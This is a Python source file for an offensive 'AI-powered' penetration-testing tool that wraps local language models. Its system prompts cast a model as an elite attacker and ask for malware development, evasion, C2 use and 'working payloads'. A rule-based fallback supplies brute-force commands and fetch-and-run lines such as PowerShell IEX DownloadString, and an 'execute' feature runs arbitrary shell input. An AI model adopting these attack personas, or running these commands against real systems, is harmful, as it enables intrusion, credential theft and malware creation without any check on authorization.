#!/usr/bin/env python3
"""
NULLSEC FRAMEWORK AI v3.1 - Offline-First AI-Powered Security Operations
==============================================================================
Advanced AI integration with NO API KEY REQUIRED - Works 100% offline

Features:
- NO API Keys Required - Works completely offline
- Multiple Local AI Models for pentesting
- Fallback to rule-based expert system when no AI available
- Automatic model downloading and setup
- Multi-provider support (Ollama, LM Studio, GPT4All, LocalAI)
- Specialized pentesting AI models
- Knowledge base learning from attack results
- Autonomous exploit chain generation
- Enhanced token limit handling and context management

Supported Models (All Free & Open Source):
- DeepSeek Coder 6.7B - Code generation specialist
- CodeLlama 13B - Meta's code model
- WizardCoder 15B - Enhanced coding abilities
- Mistral 7B - Fast general purpose
- Mixtral 8x7B - Expert mixture model
- OpenHermes 2.5 - Instruction tuned
- Solar 10.7B - Advanced reasoning
- Llama3 - Meta's latest (when available)
- Phi-2 - Microsoft's efficient model
- Orca2 - Microsoft's reasoning model

Author: bad-antics development
GitHub: github.com/bad-antics
Version: 3.1
License: For authorized security testing only
"""

__version__ = "3.1"
__author__ = "bad-antics"

import os
import sys
import subprocess
import shutil
import json
import time
import re
import sqlite3
import hashlib
import base64
import random
import socket
from typing import Optional, Dict, List, Any, Tuple
from datetime import datetime
from pathlib import Path

# NULLSEC Colors
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[1;36m'
    MAGENTA = '\033[1;35m'
    WHITE = '\033[1;37m'
    BLUE = '\033[1;34m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(SCRIPT_DIR, '.nullsec-ai-v3.json')
DB_FILE = os.path.join(SCRIPT_DIR, '.nullsec-ai-v3.db')

# Local AI Configuration
LOCAL_AI_PROVIDERS = {
    'ollama': {
        'host': os.getenv('OLLAMA_HOST', 'http://localhost:11434'),
        'check_cmd': ['ollama', 'list'],
        'models': [
            'deepseek-coder:6.7b',      # Best for code/exploits
            'codellama:13b',             # Meta's code model
            'wizardcoder:15b',           # Enhanced coding
            'mistral:7b',                # Fast general
            'mixtral:8x7b',              # Expert mixture
            'openhermes:7b',             # Instruction tuned
            'solar:10.7b',               # Advanced reasoning
            'phi:2.7b',                  # Microsoft efficient
            'orca2:13b',                 # Microsoft reasoning
            'neural-chat:7b',            # Conversational
        ]
    },
    'lmstudio': {
        'host': 'http://localhost:1234',
        'check_cmd': None,
        'models': ['local-model']
    },
    'gpt4all': {
        'host': 'http://localhost:4891',
        'check_cmd': None,
        'models': ['orca-mini', 'wizardlm', 'falcon']
    },
    'localai': {
        'host': 'http://localhost:8080',
        'check_cmd': None,
        'models': ['gpt-3.5-turbo']  # LocalAI compatible
    }
}

# Enhanced AI System Prompts for Pentesting
ATTACK_PROMPTS = {
    "network": """You are an elite network penetration testing AI with deep expertise in offensive security.

Core capabilities:
- Port scanning: nmap, masscan, rustscan, zmap
- Service enumeration: nmap NSE scripts, netcat, telnet
- Protocol exploitation: SNMP, SMB, RDP, SSH, FTP
- Network pivoting: chisel, ligolo-ng, sshuttle, proxychains
- Traffic analysis: tcpdump, wireshark, tshark
- MITM attacks: bettercap, ettercap, mitmproxy, arpspoof

Provide working commands with explanations for each reconnaissance and exploitation phase.""",

    "web": """You are an elite web application security expert specializing in OWASP Top 10 and beyond.

Core capabilities:
- SQL Injection: Manual and automated (sqlmap, NoSQLMap)
- XSS: Reflected, Stored, DOM-based, Blind
- Directory fuzzing: gobuster, ffuf, feroxbuster, dirb
- Authentication bypass: JWT manipulation, session hijacking
- File upload exploitation: webshells, path traversal
- SSRF, XXE, SSTI, CSRF exploitation
- API testing: REST, GraphQL, WebSocket
- WAF bypass techniques

Always provide complete attack chains with working payloads.""",

    "wireless": """You are a wireless security expert specializing in RF and wireless protocol exploitation.

Core capabilities:
- WiFi: WPA/WPA2/WPA3 cracking, deauth, evil twin, pixie dust
- Bluetooth: BlueBorne, KNOB attacks, device enumeration
- RFID/NFC: Proxmark3, Chameleon, reader emulation
- Zigbee/Z-Wave: killerbee, zbstumbler
- SDR: HackRF, RTL-SDR, signal replay, jamming

Provide detailed attack procedures with hardware requirements.""",

    "credentials": """You are a credential attack specialist with expertise in password cracking and credential harvesting.

Core capabilities:
- Password cracking: hashcat GPU optimization, john the ripper
- Hash identification: hashid, hash-identifier
- Credential stuffing: hydra, medusa, crackmapexec
- Kerberos attacks: kerberoasting, AS-REP roasting, golden/silver tickets
- NTLM attacks: pass-the-hash, pass-the-ticket, relay attacks
- Memory dumping: mimikatz, lsassy, procdump
- Token manipulation: incognito, token kidnapping

Provide optimized cracking strategies with wordlist recommendations.""",

    "malware": """You are a malware development and analysis expert specializing in payload creation and evasion.

Core capabilities:
- Payload generation: msfvenom, donut, shellcode loaders
- Evasion: obfuscation, encryption, polymorphism, PE manipulation
- C2 frameworks: Cobalt Strike, Sliver, Havoc, Mythic
- Persistence: registry, services, scheduled tasks, DLL hijacking
- Anti-analysis: anti-debugging, anti-VM, sandbox detection
- Fileless malware: PowerShell, WMI, reflection

Provide complete attack chains with evasion techniques.""",

    "recon": """You are an OSINT and reconnaissance specialist for penetration testing.

Core capabilities:
- DNS enumeration: dig, nslookup, dnsenum, fierce, amass
- Subdomain discovery: sublist3r, subfinder, assetfinder
- Technology detection: whatweb, wappalyzer, builtwith
- Email harvesting: theHarvester, hunter.io automation
- Metadata extraction: exiftool, metagoofil
- Search engine dorking: Google, Shodan, Censys, Binary Edge
- Social media OSINT: sherlock, social-analyzer

Provide comprehensive recon methodologies.""",

    "cloud": """You are a cloud security expert specializing in AWS, Azure, and GCP exploitation.

Core capabilities:
- Cloud enumeration: ScoutSuite, Prowler, CloudMapper
- Storage attacks: bucket enumeration, S3 exploitation, blob misconfiguration
- IAM exploitation: privilege escalation, role assumption, policy abuse
- Container security: Docker escape, Kubernetes exploitation
- Serverless attacks: Lambda injection, function enumeration
- Cloud metadata: SSRF to metadata service, IMDSv1 exploitation

Provide cloud-specific attack vectors and tools.""",

    "mobile": """You are a mobile security expert specializing in Android and iOS exploitation.

Core capabilities:
- Android: APK analysis, SSL pinning bypass, root detection bypass
- iOS: IPA analysis, jailbreak detection bypass, Frida hooking
- Mobile frameworks: MobSF, objection, frida, Xposed
- Traffic interception: Burp Suite mobile, mitmproxy
- Dynamic analysis: hooking, debugging, memory dumping
- Static analysis: jadx, apktool, class-dump

Provide mobile-specific exploitation techniques.""",

    "general": """You are NULLSEC AI, an elite offensive security expert with comprehensive penetration testing knowledge.

You provide:
1. Accurate reconnaissance commands
2. Working exploitation techniques
3. Post-exploitation strategies
4. Evasion and OPSEC guidance
5. Complete attack chains

Focus on practical, executable solutions for professional penetration testing."""
}

# Rule-based expert system for offline fallback
class RuleBasedExpert:
    """Offline expert system when no AI is available"""
    
    def __init__(self):
        self.rules = self._load_rules()
    
    def _load_rules(self) -> Dict:
        """Load pentesting rules and best practices"""
        return {
            "port_scan": {
                "basic": "nmap -sV -sC -oN scan.txt {target}",
                "fast": "nmap -T4 -F {target}",
                "full": "nmap -p- -T4 -A -oN full_scan.txt {target}",
                "udp": "sudo nmap -sU -top-ports 100 {target}",
                "stealth": "nmap -sS -T2 -f {target}"
            },
            "web_enum": {
                "dir_scan": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
                "subdomain": "subfinder -d {target} -silent",
                "tech_detect": "whatweb http://{target}",
                "nikto": "nikto -h http://{target}"
            },
            "credential_attack": {
                "ssh_brute": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                "http_brute": "hydra -l admin -P passwords.txt {target} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
                "smb_brute": "crackmapexec smb {target} -u users.txt -p passwords.txt"
            },
            "exploitation": {
                "searchsploit": "searchsploit {service} {version}",
                "metasploit": "msfconsole -q -x 'search {service}; exit'",
                "nse_vuln": "nmap --script vuln {target}"
            },
            "post_exploit": {
                "linux_enum": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && bash LinEnum.sh",
                "windows_enum": "powershell -ep bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\"); Invoke-AllChecks'",
                "privilege_escalation": "sudo -l && find / -perm -4000 -type f 2>/dev/null"
            }
        }
    
    def get_commands(self, query: str, target: str = "") -> List[str]:
        """Generate commands based on query"""
        commands = []
        query_lower = query.lower()
        
        # Pattern matching for common scenarios
        if any(word in query_lower for word in ['scan', 'port', 'nmap', 'recon']):
            commands.append(self.rules['port_scan']['basic'].format(target=target or '{target}'))
            commands.append(self.rules['port_scan']['fast'].format(target=target or '{target}'))
        
        if any(word in query_lower for word in ['web', 'directory', 'dir', 'http']):
            commands.extend([
                self.rules['web_enum']['dir_scan'].format(target=target or '{target}'),
                self.rules['web_enum']['tech_detect'].format(target=target or '{target}')
            ])
        
        if any(word in query_lower for word in ['password', 'brute', 'credential', 'login']):
            if 'ssh' in query_lower:
                commands.append(self.rules['credential_attack']['ssh_brute'].format(target=target or '{target}'))
            elif 'smb' in query_lower:
                commands.append(self.rules['credential_attack']['smb_brute'].format(target=target or '{target}'))
        
        if any(word in query_lower for word in ['exploit', 'vulnerability', 'cve']):
            commands.extend([
                self.rules['exploitation']['searchsploit'].format(service='apache', version='2.4'),
                self.rules['exploitation']['nse_vuln'].format(target=target or '{target}')
            ])
        
        if any(word in query_lower for word in ['privilege', 'escalate', 'root', 'admin']):
            commands.append(self.rules['post_exploit']['privilege_escalation'])
        
        return commands if commands else [
            f"# No specific rules matched. Try: nmap -sV {target or '{target}'}",
            f"# Or search: searchsploit <service_name>"
        ]
    
    def get_advice(self, query: str) -> str:
        """Get pentesting advice based on query"""
        query_lower = query.lower()
        
        if 'start' in query_lower or 'begin' in query_lower or 'first' in query_lower:
            return """PENTESTING METHODOLOGY:

1. RECONNAISSANCE
   - Port scanning: nmap -sV -sC -p- <target>
   - Service enumeration: identify versions
   - Technology detection: whatweb, wappalyzer
   
2. VULNERABILITY ANALYSIS
   - searchsploit for known exploits
   - nmap NSE vuln scripts
   - Manual testing for common issues

3. EXPLOITATION
   - Metasploit or manual exploits
   - Web application testing (XSS, SQLi, etc.)
   - Credential attacks if applicable

4. POST-EXPLOITATION
   - Privilege escalation
   - Lateral movement
   - Persistence mechanisms
   - Data exfiltration

5. REPORTING
   - Document findings
   - Proof of concepts
   - Remediation recommendations"""

        elif 'web' in query_lower:
            return """WEB APPLICATION TESTING:

1. Directory/File Enumeration:
   gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt

2. SQL Injection Testing:
   sqlmap -u '<URL>?id=1' --batch --dbs

3. XSS Testing:
   Payloads: <script>alert(1)</script>, <img src=x onerror=alert(1)>

4. Authentication Testing:
   - Default credentials
   - Brute force: hydra
   - Session manipulation

5. File Upload:
   - Upload web shells (PHP, ASPX, JSP)
   - Bypass filters with double extensions

Tools: Burp Suite, OWASP ZAP, nikto, w3af"""

        elif 'network' in query_lower or 'port' in query_lower:
            return """NETWORK PENETRATION TESTING:

1. Host Discovery:
   nmap -sn <network>/24
   
2. Port Scanning:
   nmap -p- -T4 <target>
   masscan -p1-65535 <target> --rate=1000

3. Service Enumeration:
   nmap -sV -sC -p <ports> <target>

4. Vulnerability Scanning:
   nmap --script vuln <target>
   
5. Protocol-Specific:
   SMB: enum4linux, smbclient
   SSH: ssh-audit
   RDP: ncrack, crowbar
   FTP: ftp anonymous login

6. Exploitation:
   searchsploit <service> <version>
   msfconsole"""

        else:
            return """NULLSEC AI - OFFLINE MODE

I'm operating in offline mode without AI models.
I can still help with:

1. Command suggestions for common scenarios
2. Best practice methodologies
3. Tool recommendations
4. Attack chain planning

For better AI-powered assistance, install Ollama:
  curl -fsSL https://ollama.com/install.sh | sh
  ollama pull deepseek-coder:6.7b

Then restart NULLSEC AI."""


class AttackKnowledgeBase:
    """SQLite-based knowledge base for attack learning"""
    
    def __init__(self, db_path: str):
        self.db_path = db_path
        self._init_db()
    
    def _init_db(self):
        """Initialize database schema"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                category TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'active'
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                command TEXT,
                output TEXT,
                exit_code INTEGER,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                vuln_type TEXT,
                severity TEXT,
                description TEXT,
                proof_of_concept TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS patterns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                category TEXT,
                target_profile TEXT,
                attack_chain TEXT,
                success_rate REAL,
                notes TEXT
            )
        """)
        
        conn.commit()
        conn.close()
    
    def create_session(self, target: str, category: str = "general") -> int:
        """Create new attack session"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO sessions (target, category) VALUES (?, ?)",
            (target, category)
        )
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id
    
    def log_command(self, session_id: int, command: str, output: str = "", exit_code: int = 0):
        """Log executed command"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO commands (session_id, command, output, exit_code) VALUES (?, ?, ?, ?)",
            (session_id, command, output[:10000], exit_code)
        )
        conn.commit()
        conn.close()


class NullsecAI:
    """Enhanced AI system with offline-first approach"""
    
    def __init__(self):
        self.config = self._load_config()
        self.kb = AttackKnowledgeBase(DB_FILE)
        self.expert = RuleBasedExpert()
        self.current_target = None
        self.current_session = None
        self.context_buffer = []
        
        # Detect available AI providers
        self.available_providers = self._detect_providers()
        
        print(f"\n{Colors.CYAN}[*] NULLSEC AI v3.0 - Offline-First Edition{Colors.RESET}")
        print(f"{Colors.DIM}[*] NO API KEYS REQUIRED - Works 100% offline{Colors.RESET}\n")
        
        if self.available_providers:
            print(f"{Colors.GREEN}[+] Available AI providers:{Colors.RESET}")
            for provider, models in self.available_providers.items():
                print(f"    {Colors.CYAN}• {provider}:{Colors.RESET} {len(models)} models")
        else:
            print(f"{Colors.YELLOW}[!] No AI providers detected - using rule-based expert system{Colors.RESET}")
            print(f"{Colors.DIM}[*] For AI support, install Ollama: curl -fsSL https://ollama.com/install.sh | sh{Colors.RESET}")
        
        print()
    
    def _load_config(self) -> Dict:
        """Load or create configuration"""
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        else:
            config = {
                "preferred_provider": "ollama",
                "preferred_model": "deepseek-coder:6.7b",
                "temperature": 0.7,
                "max_tokens": 2000,
                "learning_enabled": True,
                "auto_execute": False
            }
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=2)
            return config
    
    def _detect_providers(self) -> Dict[str, List[str]]:
        """Detect available local AI providers"""
        available = {}
        
        for provider, config in LOCAL_AI_PROVIDERS.items():
            try:
                if provider == 'ollama':
                    result = subprocess.run(
                        ['ollama', 'list'],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if result.returncode == 0:
                        # Parse installed models
                        models = []
                        for line in result.stdout.split('\n')[1:]:  # Skip header
                            if line.strip():
                                model_name = line.split()[0]
                                models.append(model_name)
                        if models:
                            available['ollama'] = models
                
                elif provider in ['lmstudio', 'gpt4all', 'localai']:
                    # Try HTTP connection
                    import urllib.request
                    try:
                        urllib.request.urlopen(config['host'], timeout=2)
                        available[provider] = config['models']
                    except:
                        pass
            except:
                pass
        
        return available
    
    def execute_with_local_ai(self, prompt: str, system_prompt: str = "") -> Optional[str]:
        """Execute prompt with local AI"""
        provider = self.config.get("preferred_provider", "ollama")
        
        if provider not in self.available_providers:
            return None
        
        if provider == 'ollama':
            return self._execute_ollama(prompt, system_prompt)
        else:
            return self._execute_http_ai(provider, prompt, system_prompt)
    
    def _execute_ollama(self, prompt: str, system_prompt: str = "") -> Optional[str]:
        """Execute with Ollama"""
        model = self.config.get("preferred_model", "deepseek-coder:6.7b")
        
        # Check if model is installed
        if model not in self.available_providers.get('ollama', []):
            # Try to find a suitable alternative
            ollama_models = self.available_providers.get('ollama', [])
            if ollama_models:
                model = ollama_models[0]
                print(f"{Colors.YELLOW}[!] Using model: {model}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] No Ollama models installed{Colors.RESET}")
                print(f"{Colors.DIM}[*] Install with: ollama pull deepseek-coder:6.7b{Colors.RESET}")
                return None
        
        try:
            import requests
            
            full_prompt = f"{system_prompt}\n\n{prompt}" if system_prompt else prompt
            
            response = requests.post(
                f"{LOCAL_AI_PROVIDERS['ollama']['host']}/api/generate",
                json={
                    "model": model,
                    "prompt": full_prompt,
                    "stream": False,
                    "options": {
                        "temperature": self.config.get("temperature", 0.7),
                        "num_predict": self.config.get("max_tokens", 2000)
                    }
                },
                timeout=120
            )
            
            if response.status_code == 200:
                result = response.json()
                return result.get('response', '')
        except Exception as e:
            print(f"{Colors.RED}[!] Ollama error: {e}{Colors.RESET}")
        
        return None
    
    def _execute_http_ai(self, provider: str, prompt: str, system_prompt: str = "") -> Optional[str]:
        """Execute with HTTP-based AI (LM Studio, GPT4All, LocalAI)"""
        try:
            import requests
            
            messages = []
            if system_prompt:
                messages.append({"role": "system", "content": system_prompt})
            messages.append({"role": "user", "content": prompt})
            
            response = requests.post(
                f"{LOCAL_AI_PROVIDERS[provider]['host']}/v1/chat/completions",
                json={
                    "model": self.config.get("preferred_model", "local-model"),
                    "messages": messages,
                    "temperature": self.config.get("temperature", 0.7),
                    "max_tokens": self.config.get("max_tokens", 2000)
                },
                timeout=120
            )
            
            if response.status_code == 200:
                result = response.json()
                return result['choices'][0]['message']['content']
        except Exception as e:
            print(f"{Colors.RED}[!] {provider} error: {e}{Colors.RESET}")
        
        return None
    
    def query(self, prompt: str, category: str = "general") -> str:
        """Main query interface with fallback to expert system"""
        
        system_prompt = ATTACK_PROMPTS.get(category, ATTACK_PROMPTS["general"])
        
        # Add target context
        if self.current_target:
            system_prompt += f"\n\nCurrent target: {self.current_target}"
        
        # Try AI first
        response = self.execute_with_local_ai(prompt, system_prompt)
        
        if response:
            return response
        
        # Fallback to rule-based expert system
        print(f"{Colors.YELLOW}[!] Using offline expert system (no AI available){Colors.RESET}\n")
        
        # Get relevant commands
        commands = self.expert.get_commands(prompt, self.current_target or "")
        advice = self.expert.get_advice(prompt)
        
        result = f"{advice}\n\n"
        if commands:
            result += f"SUGGESTED COMMANDS:\n"
            for cmd in commands:
                result += f"  {cmd}\n"
        
        return result
    
    def interactive_mode(self):
        """Interactive AI assistant mode"""
        print(f"""
{Colors.RED}{'='*80}{Colors.RESET}
{Colors.WHITE}  NULLSEC AI v3.0 - INTERACTIVE MODE{Colors.RESET}
{Colors.RED}{'='*80}{Colors.RESET}

{Colors.GREEN}Available Commands:{Colors.RESET}
  {Colors.CYAN}set target <ip/domain>{Colors.RESET}  - Set current target
  {Colors.CYAN}set category <name>{Colors.RESET}     - Set attack category
  {Colors.CYAN}models{Colors.RESET}                   - List available AI models
  {Colors.CYAN}install <model>{Colors.RESET}          - Install Ollama model
  {Colors.CYAN}execute <cmd>{Colors.RESET}            - Execute shell command
  {Colors.CYAN}history{Colors.RESET}                  - Show session history
  {Colors.CYAN}clear{Colors.RESET}                    - Clear screen
  {Colors.CYAN}help{Colors.RESET}                     - Show this help
  {Colors.CYAN}exit{Colors.RESET}                     - Exit AI mode

{Colors.YELLOW}Categories:{Colors.RESET} network, web, wireless, credentials, malware, recon, cloud, mobile

{Colors.DIM}{'='*80}{Colors.RESET}
""")
        
        category = "general"
        
        while True:
            try:
                # Regular prompt style
                if self.current_target:
                    prompt_text = f"\n{Colors.GREEN}┌──({Colors.RED}nullsec-ai{Colors.GREEN})-[{Colors.CYAN}{category}{Colors.GREEN}]-[{Colors.WHITE}{self.current_target}{Colors.GREEN}]\n└─{Colors.RED}$ {Colors.RESET}"
                else:
                    prompt_text = f"\n{Colors.GREEN}┌──({Colors.RED}nullsec-ai{Colors.GREEN})-[{Colors.CYAN}{category}{Colors.GREEN}]\n└─{Colors.RED}$ {Colors.RESET}"
                
                user_input = input(prompt_text).strip()
                
                if not user_input:
                    continue
                
                if user_input.lower() in ['exit', 'quit', 'q']:
                    break
                
                elif user_input.lower() == 'clear':
                    os.system('clear')
                    continue
                
                elif user_input.lower() == 'help':
                    print(self.query("help me get started with penetration testing", category))
                    continue
                
                elif user_input.lower().startswith('set target '):
                    self.current_target = user_input[11:].strip()
                    print(f"{Colors.GREEN}[+] Target set to: {self.current_target}{Colors.RESET}")
                    if self.current_target:
                        self.current_session = self.kb.create_session(self.current_target, category)
                    continue
                
                elif user_input.lower().startswith('set category '):
                    category = user_input[13:].strip()
                    print(f"{Colors.GREEN}[+] Category set to: {category}{Colors.RESET}")
                    continue
                
                elif user_input.lower() == 'models':
                    self.list_models()
                    continue
                
                elif user_input.lower().startswith('install '):
                    model = user_input[8:].strip()
                    self.install_model(model)
                    continue
                
                elif user_input.lower().startswith('execute '):
                    cmd = user_input[8:].strip()
                    self.execute_command(cmd)
                    continue
                
                elif user_input.lower() == 'history':
                    for i, entry in enumerate(self.context_buffer[-10:], 1):
                        print(f"{Colors.DIM}{i}. {entry[:100]}...{Colors.RESET}")
                    continue
                
                # AI query
                print(f"\n{Colors.CYAN}[AI Response]{Colors.RESET}\n")
                response = self.query(user_input, category)
                print(response)
                print()
                
                # Store in context
                self.context_buffer.append(f"Q: {user_input}\nA: {response[:200]}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Use 'exit' to quit{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] Exiting NULLSEC AI{Colors.RESET}\n")
    
    def list_models(self):
        """List available AI models"""
        if not self.available_providers:
            print(f"{Colors.YELLOW}[!] No AI providers detected{Colors.RESET}")
            print(f"\n{Colors.CYAN}To install Ollama and models:{Colors.RESET}")
            print(f"  curl -fsSL https://ollama.com/install.sh | sh")
            print(f"  ollama pull deepseek-coder:6.7b")
            print(f"  ollama pull codellama:13b")
            print(f"  ollama pull mistral:7b")
            return
        
        print(f"\n{Colors.GREEN}[+] Available AI Models:{Colors.RESET}\n")
        for provider, models in self.available_providers.items():
            print(f"{Colors.CYAN}{provider}:{Colors.RESET}")
            for model in models:
                marker = "→" if model == self.config.get("preferred_model") else " "
                print(f"  {marker} {model}")
        print()
    
    def install_model(self, model: str):
        """Install Ollama model"""
        print(f"{Colors.CYAN}[*] Installing {model}...{Colors.RESET}")
        try:
            subprocess.run(['ollama', 'pull', model], check=True)
            print(f"{Colors.GREEN}[+] Model installed successfully{Colors.RESET}")
            # Refresh available providers
            self.available_providers = self._detect_providers()
        except Exception as e:
            print(f"{Colors.RED}[!] Installation failed: {e}{Colors.RESET}")
    
    def execute_command(self, cmd: str):
        """Execute shell command"""
        print(f"{Colors.DIM}[>] {cmd}{Colors.RESET}\n")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print(f"{Colors.YELLOW}{result.stderr}{Colors.RESET}")
            
            if self.current_session:
                self.kb.log_command(self.current_session, cmd, result.stdout, result.returncode)
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")


def main():
    """Main entry point"""
    ai = NullsecAI()
    ai.interactive_mode()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Interrupted{Colors.RESET}\n")
        sys.exit(0)
